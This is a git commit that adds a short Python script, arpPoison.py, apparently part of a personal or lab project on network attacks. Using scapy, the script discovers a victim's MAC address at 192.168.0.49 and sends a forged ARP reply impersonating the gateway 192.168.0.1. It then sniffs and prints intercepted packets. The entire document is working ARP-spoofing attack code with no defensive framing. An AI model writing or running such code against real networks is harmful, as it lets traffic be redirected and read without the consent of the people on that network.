73d46add0fe4a2f845c4f2b8b8890cb68cd35364
= <=>
2025-06-22 14:34:40 +1000

    ARP Poisoning from Victim to our machine

---
+++ arpPoison.py
@@ -0,0 +1,19 @@
+from scapy.all import *
+
+ether = Ether()
+
+## Discovering MAC Address of Target Machine
+
+broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
+arp_layer = ARP(pdst = '192.168.0.49')
+entire_packet = broadcast / arp_layer
+answer = srp(entire_packet, timeout = 2, verbose = True)[0]
+
+## Creating Malicous ARP Response to victims machine
+
+target_mac_addr = answer[0][1].hwsrc
+packet = ARP(op=2, hwdst = target_mac_addr, pdst='192.168.0.49', psrc='192.168.0.1')
+send(packet, verbose = False)
+
+pkt = sniff(count = 10, prn = lambda x: x[0].show())
+
